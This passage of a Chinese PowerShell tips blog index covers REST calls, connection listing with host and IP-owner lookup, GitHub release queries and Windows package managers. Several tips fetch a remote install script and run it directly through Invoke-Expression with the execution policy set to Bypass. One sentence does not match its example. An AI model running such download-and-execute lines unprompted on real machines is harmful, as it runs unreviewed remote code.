one item off the queue $currentDirectory = $queue.Dequeue() try { # find all subfolders and add them to the queue # a classic recurse approach would have called itself right here # this approach instead pushes the future tasks just onto # the queue for later use [IO.Directory]::GetDirectories($currentDirectory) | ForEach-Object { $queue.Enqueue($_) } } catch {} try { # find all files in this folder with the given extensions [IO.Directory]::GetFiles($currentDirectory, '*.psm1') [IO.Directory]::GetFiles($currentDirectory, '*.ps1') } catch{} } 以下是 UMU 提供的，不用递归实现本任务的方法： 1[IO.Directory]::EnumerateFiles('path', '*', 1)","link":"/2021/01/01/a-better-recursion/"},{"title":"PowerShell 技能连载 - 了解 PowerShell 中的 REST Web 服务","text":"Web 服务类型很多，PowerShell 可以使用 Invoke-RestMethod 访问其中的许多服务。这是一个快速入门，可帮助您起步。 这是最简单的形式，Web 服务就是上面带有结构化数据的网页。您可以在浏览器中使用相同的 URL 来查看数据。PowerShell 使用 Invoke-RestMethod 检索数据。这为您提供了最新的 PowerShell 团队博客： 12Invoke-RestMethod -Uri https://blogs.msdn.microsoft.com/powershell/feed/ | Select-Object -Property Title, pubDate 像上面的那种简单的 REST Web 服务可以接受参数。这些参数可以作为 URL 的一部分提交。这是一个可以接受任何数字并返回有关该数字的部分意义信息的 Web 服务。下次您被邀请参加 25 周年纪念日时，您可能想查询一些有关数字 25 的有趣信息： 12345678PS&gt; Invoke-RestMethod http://numbersapi.com/2525 is the number of cents in a quarter.PS&gt; Invoke-RestMethod http://numbersapi.com/2525 is the (critical) number of Florida electoral votes for the 2000 U.S. presidential election.PS&gt; Invoke-RestMethod http://numbersapi.com/2525 is the minimum age of candidates for election to the United States House of Representatives. 其他 Web 服务通过不可见的 POST 数据传入用户数据（类似于网站上的表单数据）。它们可能还需要会话状态、cookie 和/或登录。 这是最后一个例子： 123456789101112131415# https://4bes.nl/2020/08/23/calling-a-rest-api-from-powershell/$Body = @{ Cook = &quot;Freddy&quot; Meal = &quot;PastaConCarne&quot;}$Parameters = @{ Method = &quot;POST&quot; Uri = &quot;https://4besday4.azurewebsites.net/api/AddMeal&quot; Body = ($Body | ConvertTo-Json) ContentType = &quot;application/json&quot;}Invoke-RestMethod @Parameters -SessionVariable cookieInvoke-RestMethod &quot;https://4besday4.azurewebsites.net/api/AddMeal&quot; -WebSession $cookie 哈希表类似于您要发送到 Web 服务的参数。它们将转换为 JSON 格式。由 Web 服务确定接受用户输入的格式。然后，使用 POST方法将数据传输到 Web 服务。 如果您为向指定名字的厨师发送一个请求，则会从 Web 服务中获取一条通知，告知您正在准备食品。确保更改 Cook 和 Meal 的数据。 如您所见，Invoke-RestMethod 使用了两次。第一次调用获取会话状态和 cookie，并将其存储在使用 -SessionVariable 参数定义的 $cookie 变量中。 第二个调用通过 -WebSession 参数提交会话状态。这样，Web 服务可以保留每次调用之间的状态并清楚地标识您。","link":"/2021/01/05/understanding-rest-web-services-in-powershell/"},{"title":"PowerShell 技能连载 - 查找未使用（或使用过的）驱动器号","text":"通过连接类型转换的结果，您可以轻松创建字母列表： 123456PS&gt; [Char[]](65..90)ABCD... 从此列表中，您可以生成正在使用的驱动器号的列表： 123PS&gt; [Char[]](65..90) | Where-Object { Test-Path &quot;${_}:\\&quot; }CD 同样，要查找空闲的（未使用的）驱动器号，请尝试以下操作： 123456PS&gt; [Char[]](65..90) | Where-Object { (Test-Path &quot;${_}:\\&quot;) -eq $false }ABEF...","link":"/2021/01/07/finding-unused-or-used-drive-letters/"},{"title":"PowerShell 技能连载 - 获取开机以来经历的时间","text":"PowerShell 7 附带了一个名为 Get-Uptime 的新 cmdlet。它返回一个 timepan 对象，该对象具有自上次重新引导以来已过去的时间： 1234567891011121314PS&gt; Get-UptimeDays : 9Hours : 23Minutes : 21Seconds : 14Milliseconds : 0Ticks : 8616740000000TotalDays : 9,9730787037037TotalHours : 239,353888888889TotalMinutes : 14361,2333333333TotalSeconds : 861674TotalMilliseconds : 861674000 提交 -Since 参数时，它将返回上次重新启动的日期。 Get-Uptime 在 Windows PowerShell 中不可用，但是自行创建此命令很简单。运行以下代码在 Windows PowerShell 中创建自己的 Get-Uptime 命令： 1234567891011121314function Get-Uptime{ param([Switch]$Since) $date = (Get-CimInstance -Class Win32_OperatingSystem).LastBootUpTime if ($Since) { return $date } else { New-Timespan -Start $date }}","link":"/2021/01/11/controlling-uptime/"},{"title":"PowerShell 技能连载 - 更好的 NetStat（第 1 部分）","text":"在 Windows 系统上，netstat.exe 是一个有用的实用程序，用于检查打开的端口和侦听器。但是，该工具仅返回文本，具有隐式参数，并且无法跨平台使用。 在 Windows 系统上，可以使用名为 Get-NetTCPConnection 的新 PowerShell cmdlet，该 cmdlet 模仿 netstat.exe 中的许多功能。例如，您可以列出任何软件（浏览器）当前打开的所有 HTTPS 连接（端口443）： 12345678910111213141516171819PS&gt; Get-NetTCPConnection -RemotePort 443 -State EstablishedLocalAddress LocalPort RemoteAddress RemotePort State AppliedSetting OwningProcess------------ --------- ------------- ---------- ----- -------------- -------------192.168.2.105 58640 52.114.74.221 443 Established Internet 14204192.168.2.105 56201 52.114.75.149 443 Established Internet 9432192.168.2.105 56200 52.114.142.145 443 Established Internet 13736192.168.2.105 56199 13.107.42.12 443 Established Internet 12752192.168.2.105 56198 13.107.42.12 443 Established Internet 9432192.168.2.105 56192 40.101.81.162 443 Established Internet 9432192.168.2.105 56188 168.62.58.130 443 Established Internet 10276192.168.2.105 56181 168.62.58.130 443 Established Internet 10276192.168.2.105 56103 13.107.6.171 443 Established Internet 9432192.168.2.105 56095 13.107.42.12 443 Established Internet 9432192.168.2.105 56094 13.107.43.12 443 Established Internet 9432192.168.2.105 55959 140.82.112.26 443 Established Internet 21588192.168.2.105 55568 52.113.206.137 443 Established Internet 13736192.168.2.105 55555 51.103.5.186 443 Established Internet 12752192.168.2.105 49638 51.103.5.186 443 Established Internet 5464 不幸的是，Get-NetTCPConnection 有严格的限制。例如，它无法解析 IP 地址或进程 ID，因此您无法轻松发现所连接的服务器名称以及维护连接的程序。并且仅在 Windows 系统上可用。 在接下来的部分中，让我们一一消除这些限制。","link":"/2021/01/13/a-better-netstat-part-1/"},{"title":"PowerShell 技能连载 - 更好的 NetStat（第 2 部分）","text":"在上一个技巧中，我们介绍了 Get-NetTCPConnection cmdlet，它是 Windows 系统上 netstat.exe 网络实用程序的更好替代方案。它可以列出打开的端口和连接，我们以列出所有与 HTTPS（端口443）的连接的示例作为总结： 12345678910111213141516171819PS&gt; Get-NetTCPConnection -RemotePort 443 -State EstablishedLocalAddress LocalPort RemoteAddress RemotePort State AppliedSetting OwningProcess------------ --------- ------------- ---------- ----- -------------- -------------192.168.2.105 58640 52.114.74.221 443 Established Internet 14204192.168.2.105 56201 52.114.75.149 443 Established Internet 9432192.168.2.105 56200 52.114.142.145 443 Established Internet 13736192.168.2.105 56199 13.107.42.12 443 Established Internet 12752192.168.2.105 56198 13.107.42.12 443 Established Internet 9432192.168.2.105 56192 40.101.81.162 443 Established Internet 9432192.168.2.105 56188 168.62.58.130 443 Established Internet 10276192.168.2.105 56181 168.62.58.130 443 Established Internet 10276192.168.2.105 56103 13.107.6.171 443 Established Internet 9432192.168.2.105 56095 13.107.42.12 443 Established Internet 9432192.168.2.105 56094 13.107.43.12 443 Established Internet 9432192.168.2.105 55959 140.82.112.26 443 Established Internet 21588192.168.2.105 55568 52.113.206.137 443 Established Internet 13736192.168.2.105 55555 51.103.5.186 443 Established Internet 12752192.168.2.105 49638 51.103.5.186 443 Established Internet 5464 该列表本身并不是很有用，因为它不能解析 IP 地址，也不会告诉您哪些程序保持着连接。但是，借助一点 PowerShell 魔术，您可以解决以下问题： 1234567891011121314151617181920212223242526272829$Process = @{ Name='Process' Expression={ # return process path (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path }}$HostName = @{ Name='Host' Expression={ $remoteHost = $_.RemoteAddress try { # try to resolve IP address [Net.Dns]::GetHostEntry($remoteHost).HostName } catch { # if that fails, return IP anyway $remoteHost } }}# get all connections to port 443 (HTTPS)Get-NetTCPConnection -RemotePort 443 -State Established | # where there is a remote address Where-Object RemoteAddress | # and resolve IP and process ID Select-Object -Property $HostName, OwningProcess, $Process Select-Object 选择要显示的对象。它支持“计算属性”。 $Process 定义了一个名为 “Process“ 的计算属性：它采用原始的 OwningProcess 属性，并通过 Get-Process 处理它的进程 ID，以获取应用程序的路径。 $HostName 中也会发生同样的情况：在此，用 .NET 的 GetHostEntry() 方法解析 IP 并返回解析的主机名。现在的结果如下所示： Host OwningProcess Process ---- ------------- ------- 13.107.6.171 9432 C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE 1drv.ms 9432 C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE lb-140-82-113-26-iad.github.com 21588 C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe 1drv.ms 9432 C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE 52.113.206.137 13736 C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe 51.103.5.186 12752 C:\\Users\\tobia\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe 不过这样做的成本可能很高，因为解析 IP 地址可能会花费很长时间，尤其是在查询超时时。在下一部分中，我们将介绍并行处理以加快处理速度。","link":"/2021/01/15/a-better-netstat-part-2/"},{"title":"PowerShell 技能连载 - 更好的 NetStat（第 3 部分）","text":"在上一个技巧中，我们介绍了 Get-NetTCPConnection cmdlet，它是 Windows 系统上网络实用程序 netstat.exe 的更好替代方法，并且通过一些技巧，您甚至可以解析 IP 地址和进程 ID。但是，这会大大降低命令的速度，因为 DNS 查找可能会花费一些时间，尤其是在网络超时的情况下。 让我们研究一下新的 PowerShell 7 并行处理功能如何加快处理速度。 以下是具有传统顺序处理的原始代码，该代码转储所有连接到端口 443 并解析主机名和进程（缓慢）： 1234567891011121314151617181920212223242526272829$Process = @{ Name='Process' Expression={ # return process path (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path }}$HostName = @{ Name='Host' Expression={ $remoteHost = $_.RemoteAddress try { # try to resolve IP address [Net.Dns]::GetHostEntry($remoteHost).HostName } catch { # if that fails, return IP anyway $remoteHost } }}# get all connections to port 443 (HTTPS)Get-NetTCPConnection -RemotePort 443 -State Established | # where there is a remote address Where-Object RemoteAddress | # and resolve IP and Process ID Select-Object -Property $HostName, OwningProcess, $Process 这是一种利用 PowerShell 7 中新的“并行循环”功能的方法（快速）： 1234567891011121314151617181920212223242526# get all connections to port 443 (HTTPS)Get-NetTCPConnection -RemotePort 443 -State Established | # where there is a remote address Where-Object RemoteAddress | # start parallel processing here # create a loop that runs with 80 consecutive threads ForEach-Object -ThrottleLimit 80 -Parallel { # $_ now represents one of the results emitted # by Get-NetTCPConnection $remoteHost = $_.RemoteAddress # DNS resolution occurs now in separate threads # at the same time $hostname = try { # try to resolve IP address [Net.Dns]::GetHostEntry($remoteHost).HostName } catch { # if that fails, return IP anyway $remoteHost } # compose the calculated information into one object [PSCustomObject]@{ HostName = $hostname OwningProcess = $_.OwningProcess Process = (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path } } 如您所见，第二种方法比以前快得多，并且是 PowerShell 7 中新的“并行循环”的好用例。 但是，不利的一面是，该代码现在的兼容性更低，只能在 Windows 系统上运行，并且只能在 PowerShell 7 中运行。在本系列的最后一部分中，我们将展示一个更简单的解决方案，该解决方案可以在所有版本的 PowerShell 上运行。","link":"/2021/01/19/a-better-netstat-part-3/"},{"title":"PowerShell 技能连载 - 更好的 NetStat（第 4 部分）","text":"在上一个技巧中，我们介绍了 Get-NetTCPConnection cmdlet，它是 Windows 系统上 netstat.exe 网络实用程序的更好替代方案，但是此命令仅限于 Windows，并且需要大量其他代码才能将原始信息转化为有用的信息。解析的主机名和进程名。 netstat.exe 的最兼容替代方案是基于 .NET Core 的解决方案，无论 PowerShell 在哪里运行，它都可以跨平台使用。 只需自己获取开源的 GetNetStat 模块 (https://github.com/TobiasPSP/GetNetStat)，它使用 .NET Core 代码来获取连接信息： 1PS&gt; Install-Module -Name GetNetStat -Scope CurrentUser 安装模块后，将有一个名为 Get-NetStat 的新命令。现在，列出打开的连接非常简单，现在您可以在 Windows PowerShell 和 PowerShell 7 中通过并行处理来解析主机名和进程名。 这个简单的命令列出了到 HTTPS（端口 443）的所有打开的连接，并解析主机名： 123456789101112PS&gt; Get-NetStat -RemotePort 443 -State Established -Resolve | Select-Object -Property RemoteIp, Pid, PidNameRemoteIp PID PIDName-------- --- -------1drv.ms 9432 WINWORDlb-140-82-113-26-iad.github.com 21588 chrome1drv.ms 9432 WINWORD1drv.ms 9432 WINWORD51.103.5.186 5464 svchost51.103.5.186 12752 OneDrive52.113.206.137 13736 Teams51.107.59.180 14484 pwsh","link":"/2021/01/21/a-better-netstat-part-4/"},{"title":"PowerShell 技能连载 - 检测未知的网络监听器","text":"通常，当您检查网络连接时，您只能看到远程访问者使用的IP地址。IP 地址通常没有通过 DNS 解析，因此您实际上并不知道谁连接了您的计算机。 如果您想找出谁拥有未知 IP 地址，可以使用免费的 RESTful 网络服务。此行代码将显示指定 IP 地址的所有权： 123456789101112PS&gt; Invoke-RestMethod -Uri 'http://ipinfo.io/51.107.59.180/json'ip : 51.107.59.180city : Zürichregion : Zurichcountry : CHloc : 47.3667,8.5500org : AS8075 Microsoft Corporationpostal : 8001timezone : Europe/Zurichreadme : https://ipinfo.io/missingauth 将此命令与其他命令结合使用，可以找出与您的计算机进行通信的人员。例如，Get-NetTcpConnection 列出了您的网络连接，现在您可以查找谁是您所连接的 IP 地址背后的所有者。 在下面的示例中，Get-NetTcpConnection 返回所有当前活动的 HTTPS 连接（端口443）。远程 IP 被自动解析，因此您可以知道哪个软件正在保持连接，以及该软件正在与谁通信： 123456789101112131415161718192021222324$Process = @{ Name='Process' Expression={ # return process path (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path }}$IpOwner = @{ Name='RemoteAuthority' Expression={ $ip = $_.RemoteAddress $info = Invoke-RestMethod -Uri &quot;http://ipinfo.io/$ip/json&quot; '{0} ({1})' -f $info.Org, $info.City }}# get all connections to port 443 (HTTPS)Get-NetTCPConnection -RemotePort 443 -State Established | # where there is a remote address Where-Object RemoteAddress | # and resolve IP and Process ID Select-Object -Property $IPOwner, RemoteAddress, OwningProcess, $Process 下面是一个实际示例：让我们转储本地管理员组。您可以按名称或不区分文化的 SID 来访问组： RemoteAuthority RemoteAddress OwningProcess Process --------------- ------------- ------------- ------- AS8075 Microsoft Corporation (Amsterdam) 52.114.74.221 14204 C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe AS8075 Microsoft Corporation (Hampden Sydney) 52.114.133.169 13736 C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe AS36459 GitHub, Inc. (Ashburn) 140.82.113.26 21588 C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe AS8068 Microsoft Corporation (Redmond) 13.107.42.12 9432 C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE AS8075 Microsoft Corporation (Zürich) 51.107.59.180 14484 C:\\Program Files\\PowerShell\\7\\pwsh.exe AS8068 Microsoft Corporation (Redmond) 13.107.42.12 9432 C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE AS8075 Microsoft Corporation (San Antonio) 52.113.206.137 13736 C:\\Users\\tobia\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe AS8075 Microsoft Corporation (Paris) 51.103.5.186 12752 C:\\Users\\tobia\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe 有趣吧？","link":"/2021/01/25/identifying-unknown-network-listeners/"},{"title":"PowerShell 技能连载 - 识别位置和公共 IP","text":"下面的示例返回您的公共 IP 地址和位置： 12345678910111213PS&gt; Invoke-RestMethod -Uri 'ipinfo.io/json'ip : 84.183.236.178hostname : p54b7ecb2.dip0.t-ipconnect.decity : Hannoverregion : Lower Saxonycountry : DEloc : 52.3705,9.7332org : AS3320 Deutsche Telekom AGpostal : 30159timezone : Europe/Berlinreadme : https://ipinfo.io/missingauth","link":"/2021/01/27/identifying-location-and-public-ip/"},{"title":"PowerShell 技能连载 - 识别当前时区","text":"显然，您可以这样向您的计算机查询当前时区： 123456789PS&gt; Get-TimeZoneId : W. Europe Standard TimeDisplayName : (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, ViennaStandardName : W. Europe Standard TimeDaylightName : W. Europe Daylight TimeBaseUtcOffset : 01:00:00SupportsDaylightSavingTime : True 但是，此信息是否正确取决于您的实际配置。当您将笔记本电脑带到其他地方时，不一定会更新您的时区。 找出当前时区的另一种方法是调用公共 Web 服务。根据您当前的互联网连接，它会根据您当前所在的位置返回时区： 123456789101112131415161718PS&gt; Invoke-RestMethod -Uri 'http://worldtimeapi.org/api/ip'abbreviation : CETclient_ip : 84.183.236.178datetime : 2021-01-04T13:31:57.398092+01:00day_of_week : 1day_of_year : 4dst : Falsedst_from :dst_offset : 0dst_until :raw_offset : 3600timezone : Europe/Berlinunixtime : 1609763517utc_datetime : 2021-01-04T12:31:57.398092+00:00utc_offset : +01:00week_number : 1","link":"/2021/01/29/identifying-current-time-zone/"},{"title":"PowerShell 技能连载 - 使用 GitHub Web Service（第 1 部分）","text":"如今，GitHub 托管了许多开源软件。这包括诸如 Windows Terminal 或 Visual Studio Code 编辑器之类的强大工具。 GitHub 提供公共 web service 来查询已注册组织（例如 Microsoft）的 repository 详细信息，因此，如果您想了解特定软件是否有新版本，请尝试查询该 web service。 下面的示例查询组织 “Microsoft” 中 “Windows Terminal” repository 的详细信息： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374PS&gt; $url = 'https://api.github.com/repos/microsoft/terminal/releases/latest'PS&gt; Invoke-RestMethod -UseBasicParsing -Uri $urlurl : https://api.github.com/repos/microsoft/terminal/releases/34250658assets_url : https://api.github.com/repos/microsoft/terminal/releases/34250658/assetsupload_url : https://uploads.github.com/repos/microsoft/terminal/releases/34250658/asse ts{?name,label}html_url : https://github.com/microsoft/terminal/releases/tag/v1.4.3243.0id : 34250658author : @{login=DHowett; id=189190; node_id=MDQ6VXNlcjE4OTE5MA==; avatar_url=https://avatars2.githubusercontent.com/u/189190?v=4; gravatar_id=; url=https://api.github.com/users/DHowett; html_url=https://github.com/DHowett; followers_url=https://api.github.com/users/DHowett/followers; following_ur l=https://api.github.com/users/DHowett/following{/other_user}; gists_url=https://api.github.com/users/DHowett/gists{/gist_id}; starred_url=https://api.github.com/users/DHowett/starred{/owner}{/repo}; subscriptions_url=https://api.github.com/users/DHowett/subscriptions; organizations_url=https://api.github.com/users/DHowett/orgs; repos_url=https://api.github.com/users/DHowett/repos; events_url=https://api.github.com/users/DHowett/events{/privacy}; received_events_url=https://api.github.com/users/DHowett/received_events; type=User; site_admin=False}node_id : MDc6UmVsZWFzZTM0MjUwNjU4tag_name : v1.4.3243.0target_commitish : mainname : Windows Terminal v1.4.3243.0draft : Falseprerelease : Falsecreated_at : 2020-11-20T21:34:28Zpublished_at : 2020-11-20T21:43:33Zassets : {@{url=https://api.github.com/repos/microsoft/terminal/releases/assets/285 75927; id=28575927; node_id=MDEyOlJlbGVhc2VBc3NldDI4NTc1OTI3; name=Microsoft.WindowsTerminal_1.4.3243.0_8wekyb3d8bbwe.msixbundle; label=; uploader=; content_type=application/octet-stream; state=uploaded; size=22834909; download_count=28268; created_at=2020-11-20T21:43:26Z; updated_at=2020-11-20T21:43:28Z; browser_download_url=https://github.com/m icrosoft/terminal/releases/download/v1.4.3243.0/Microsoft.WindowsTerminal_ 1.4.3243.0_8wekyb3d8bbwe.msixbundle}, @{url=https://api.github.com/repos/m icrosoft/terminal/releases/assets/28575931; id=28575931; node_id=MDEyOlJlbGVhc2VBc3NldDI4NTc1OTMx; name=Microsoft.WindowsTerminal_1 .4.3243.0_8wekyb3d8bbwe.msixbundle_Windows10_PreinstallKit.zip; label=; uploader=; content_type=application/zip; state=uploaded; size=22311138; download_count=5063; created_at=2020-11-20T21:43:31Z; updated_at=2020-11-20T21:43:32Z; browser_download_url=https://github.com/m icrosoft/terminal/releases/download/v1.4.3243.0/Microsoft.WindowsTerminal_ 1.4.3243.0_8wekyb3d8bbwe.msixbundle_Windows10_PreinstallKit.zip}}tarball_url : https://api.github.com/repos/microsoft/terminal/tarball/v1.4.3243.0zipball_url : https://api.github.com/repos/microsoft/terminal/zipball/v1.4.3243.0body : This is a quick servicing release to address a couple glaring issues in the 1.4 stable release. A [preinstallation](https://docs.microsoft.com/en-us/windows/msix/desktop/ deploy-preinstalled-apps) kit is available for system integrators and OEMs interested in prepackaging Windows Terminal with a Windows image. More information is available in the [DISM documentation on preinstallatio n](https://docs.microsoft.com/windows-hardware/manufacture/desktop/preinst all-apps-using-dism). Users who do not intend to preinstall Windows Terminal should continue using the _msixbundle_ distribution. Bugs fixed in this release: * We reverted the tab switcher to _off by default_, because we changed your defaults on you so that tab switching was both enabled and _in most-recently-used order_. I'm sorry about that. (#8325) * To turn the switcher back on, in MRU order, add the global setting `&quot;useTabSwitcher&quot;: true`. * We'd previously said the default value for `backgroundImageStretch` was `uniformToFill`, but it was actually `fill`. We've updated the code to make it `uniformToFill`. (#8280) * The tab switcher used to occasionally eat custom key bindings and break, but @Don-Vito came through and helped it not do that. Thanks! (#8250) 从这些丰富的信息中，您可以选择需要了解的详细信息，即各种格式的最新下载位置： 12345678$url = 'https://api.github.com/repos/microsoft/terminal/releases/latest'$info = Invoke-RestMethod -UseBasicParsing -Uri $url[PSCustomObject]@{ TAR = $info.tarball_url ZIP = $info.zipball_url AppX = $info.Assets.Browser_Download_url[0]} | Format-List 结果如下： TAR : https://api.github.com/repos/microsoft/terminal/tarball/v1.4.3243.0 ZIP : https://api.github.com/repos/microsoft/terminal/zipball/v1.4.3243.0 AppX : https://github.com/microsoft/terminal/releases/download/v1.4.3243.0/Microsoft.WindowsT erminal_1.4.3243.0_8wekyb3d8bbwe.msixbundle","link":"/2021/02/02/using-github-web-services-part-1/"},{"title":"PowerShell 技能连载 - 使用 GitHub Web Service（第 2 部分）","text":"在上一个技能中，我们研究了组织的 GitHub Web 服务 API。现在，让我们看看如何使用单个 GitHub 帐户。 道格·芬克（Doug Finke）创建了一个名为 “ImportExcel” 的出色的开源 PowerShell 模块，该模块使处理 Excel 文件变得轻而易举：https://github.com/dfinke/ImportExcel。他的公共 GitHub 用户名是 dfinke。 要查找他的作品的最新版本以及在何处下载，请尝试以下操作： 12345$username = 'dfinke'$reponame = 'ImportExcel'$url = &quot;https://api.github.com/repos/$username/$reponame/releases/latest&quot;Invoke-RestMethod -UseBasicParsing -Uri $url | Select-Object -Property tag_name, published_at, zipball_url, name 结果看起来像这样： tag_name published_at zipball_url -------- ------------ ----------- v7.1.0 2020-03-21T00:38:13Z https://api.github.com/repos/dfinke/ImportExcel/zipball/v7.1.0 请注意，下载 URL 将下载 GitHub 上所见的整个软件工程。如果您只想使用他的 PowerShell 模块，请选择发布到 PowerShell Gallery 的即用型 PowerShell 模块： 1PS&gt; Install-Module -Name ImportExcel -Scope CurrentUser 安装模块后，由于 Doug 的出色工作，您现在可以将任何数据通过管道传输到 Export-Excel。如果愿意，请创建包含 Doug 模块完整版本历史记录的 Excel 工作表： 12345678910111213$username = 'dfinke'$reponame = 'ImportExcel'$url = https://api.github.com/repos/$username/$reponame/releasesInvoke-RestMethod -UseBasicParsing -Uri $url |# workaround needed for any JSON web service result that# consists of more than one datasetForEach-Object { $_ } |Sort-Object -Property published_at -Descending |Select-Object -Property published_at, Name, Url, body |Export-Excel","link":"/2021/02/04/using-github-web-services-part-2/"},{"title":"PowerShell 技能连载 - 将文本翻译成莫尔斯电码","text":"似乎几乎所有东西都有 Web Service。这是一个将文本转换为摩尔斯电码的 Web Service： 1234567891011$Text = 'SOS This is an emergency!'# URL-encode textAdd-Type -AssemblyName System.Web$encoded = [System.Web.HttpUtility]::UrlEncode($Text)# compose web service URL$Url = &quot;https://api.funtranslations.com/translate/morse.json?text=$encoded&quot;# call web service(Invoke-RestMethod -UseBasicParsing -Uri $url).contents.translated 结果看起来像这样： ... --- ... - .... .. ... .. ... .- -. . -- . .-. --. . -. -.-. -.-- ---. 如果您确实对摩尔斯电码有兴趣，请解析结果文本并创建真正的哔哔声： 123456789101112131415161718192021222324252627$Text = 'Happy New Year 2021!'# URL-encode textAdd-Type -AssemblyName System.Web$encoded = [System.Web.HttpUtility]::UrlEncode($Text)# compose web service URL$Url = &quot;https://api.funtranslations.com/translate/morse.json?text=$encoded&quot;# call web service$morse = (Invoke-RestMethod -UseBasicParsing -Uri $url).contents.translatedForeach ($char in $morse.ToCharArray()){ switch ($char) { '.' { [Console]::Beep(800, 300) } '-' { [Console]::Beep(800, 900) } ' ' { Start-Sleep -Milliseconds 500 } default { Write-Warning &quot;Unknown char: $_&quot; [Console]::Beep(2000, 500) } } Write-Host $char -NoNewline Start-Sleep -Milliseconds 200}Write-Host &quot;OK&quot;","link":"/2021/02/08/translating-text-to-morse-code/"},{"title":"PowerShell 技能连载 - 在 Windows 上安装 PowerShell 7 的最简单方法","text":"为 Windows 用户下载和安装 PowerShell 7 的最简单，最灵活的方法可能是运行以下单行代码： 1Invoke-RestMethod -Uri https://aka.ms/install-powershell.ps1 | New-Item -Path function: -Name Install-PowerShell | Out-Null 它创建了一个拥有许多参数的 cmdlet Install-PowerShell。例如，要将 Windows 7 的最新生产版本作为便携式应用程序下载到您选择的文件夹中，请运行以下命令： 1Install-PowerShell -Destination c:\\ps7test -AddToPath 如果您希望以托管的 MSI 应用程序的形式安装 PowerShell 7，请运行以下命令： 1Install-PowerShell -UseMSI -Quiet 注意：真正安静的安装需要管理员权限。","link":"/2021/02/10/simplest-way-to-install-powershell-7-on-windows/"},{"title":"PowerShell 技能连载 - 探索 Windows 上的程序包管理器（第 1 部分）","text":"在 Linux 世界中，程序包管理器是一种下载和安装软件的既定方法。在 Windows 上，包管理器对于许多人来说仍然是新概念。 如果您是 Windows 系统管理员，并且想为所有用户下载并安装标准软件包，那么 “Chocolatey” 将是首选。该程序包管理器在拥有完全管理员权限的情况下最有效，并使用其默认安装程序包安装软件。 注意：为了能够运行脚本和下载代码，作为先决条件，您可能必须运行以下代码： 123[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor[System.Net.SecurityProtocolType]::Tls12Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force 要安装 Chocolatey，请在 PowerShell 中运行以下行： 1Invoke-RestMethod -UseBasicParsing -Uri 'https://chocolatey.org/install.ps1' | Invoke-Expression 安装成功后，会有一个名为 choco 的新命令，您现在可以使用该命令下载和安装软件。 例如，如果您想为所有用户安装 PowerShell 7，请运行以下命令： 1choco install powershell-core","link":"/2021/02/12/discovering-package-managers-on-windows-part-1/"},{"title":"PowerShell 技能连载 - 探索 Windows 上的程序包管理器（第 2 部分）","text":"在上一个技巧中，我们讨论了 “Chocolatey” 程序包管理器，如果您想为所有用户安装软件（需要管理员权限），该程序最有效。 另一个出色的软件包管理器是 “Scoop”，它针对没有管理员权限的普通用户。Scoop 严格为当前用户下载并安装软件，并且是便携式应用程序。 注意：为了能够运行脚本和下载代码，您可能必须先运行以下代码： 123[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor[System.Net.SecurityProtocolType]::Tls12Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force 要安装此程序包管理器，请在 PowerShell中运行以下几行（无需管理员权限）： 123Invoke-RestMethod -UseBasicParsing -Uri 'https://get.scoop.sh' | Invoke-Expressionscoop install gitscoop bucket add extras 安装后，会生成一个名为 “Scoop” 的新命令。 现在，您可以安装可能需要的所有工具。以下几行安装 PowerShell 7、Windows Terminal、7Zip、Notepad ++ 和 Visual Studio Code 编辑器： 12345scoop install pwshscoop install windows-terminalscoop install 7zipscoop install notepadplusplusscoop install vscode-portable 使用命令 “scoop search [phrase]“，您可以搜索其他可用的安装软件包。 Scoop 将所有软件作为便携式应用程序安装在其自己的文件夹中，您可以这样打开： 1explorer $home\\Scoop\\Apps 某些安装包可能会向您的桌面和任务栏添加链接.但是通常您需要访问 scoop 安装文件夹，手动启动应用程序，然后将其固定到任务栏或开始菜单以方便访问。 重要说明：”Scoop” 下载并安装软件包，并尝试解决依赖关系。但是，”Windows Terminal” 之类的某些软件包可能有其他要求（例如Windows Build 1903 或更高版本），因此，如果软件在安装后无法启动，则可能需要检查其他要求。","link":"/2021/02/16/discovering-package-managers-on-windows-part-2/"},{"title":"PowerShell 技能连载 - 跨平台的 Out-GridView","text":"Out-GridView 是最常用的 cmdlet 之一，它会打开一个通用选择对话框。不幸的是，PowerShell 只能在 Windows 操作系统上显示图形元素，例如窗口。在 Linux 和 macOS 上，图形 cmdlet（例如 Out-GridView）不可用。 您可能想尝试使用新的基于文本的 Out-ConsoleGridView。此 cmdlet 仅适用于PowerShell 7（在Windows PowerShell中不起作用）。像这样安装它： 1Install-Module -Name Microsoft.PowerShell.ConsoleGuiTools -Scope CurrentUser 安装完成后，在许多情况下，您现在可以轻松地将 Out-GridView 替换为 Out-ConsoleGridView，并享受类似于旧版 Norton Commander 的基于文本的选择对话框。这是旧版 Windows PowerShell 脚本，无法在 Linux 上使用： 123456Get-Process |Where-Object MainWindowHandle |Select-Object -Property Name, Id, Description |Sort-Object -Property Name |Out-GridView -Title 'Prozesse' -OutputMode Multiple |Stop-Process -WhatIf 只需将 Out-GridView 替换为 